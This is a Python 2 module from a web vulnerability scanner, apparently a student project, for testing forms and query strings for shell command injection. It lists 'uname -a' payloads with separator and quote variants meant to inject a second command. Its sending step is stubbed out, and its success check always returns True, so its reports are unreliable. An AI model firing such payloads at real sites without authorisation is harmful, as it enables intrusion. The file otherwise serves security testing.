from AttackModule import AttackModule
from Helpers import Helper

# Dangerous inputs for PHP based web servers
# https://www.kevinlondon.com/2015/07/26/dangerous-python-functions.html
# https://github.com/PortSwigger/command-injection-attacker
#

class ShlCmdInjAttackModule(AttackModule):
	attackPatterns = [
		"uname -a",	
		"uname -a #",
		"; uname -a",
		"; uname -a;",
		"; uname -a; ",

		"\'uname -a\'",	
		"\'uname -a #\'",
		"\'; uname -a\'",
		"\'; uname -a;\'",
		"\'; uname -a; \'",

		"\"uname -a\"",	
		"\"uname -a #\"",
		"\"; uname -a\"",
		"\"; uname -a;\"",
		"\"; uname -a; \""
	]
	unameString = "Linux student-CS5331-A2 3.13.0-32-generic"


	def __init__(self):
		AttackModule.__init__(self, "Shell Command Injection", "Command Injection")
		

	def attack(self, endpoint):
		if True not in (endpoint.is_form(), endpoint.has_query_string()):
			print "Target: {0}\nIs not a form, nor a has a query string. Skipping!".format(endpoint.url)
			return
		
		print "Beginning attack -> Shell Command Injection\nTarget: {0}".format(endpoint.url)
		totalAttacks = len(ShlCmdInjAttackModule.attackPatterns)
		attackCounter = 1
		for attackPattern in ShlCmdInjAttackModule.attackPatterns:
			print "  [ {0} / {1}, {2} ] ->".format(attackCounter, totalAttacks, attackPattern),
			print self.is_attack_successful(self.launch_attack(endpoint))
			attackCounter += 1
	
	def launch_attack(self, endpoint):
		#if endpoint.method.upper() == "GET":
			#return Helper.do_get_request(endpoint, {}, {})
		return None

	def is_attack_successful(self, res):
		return True
			
		
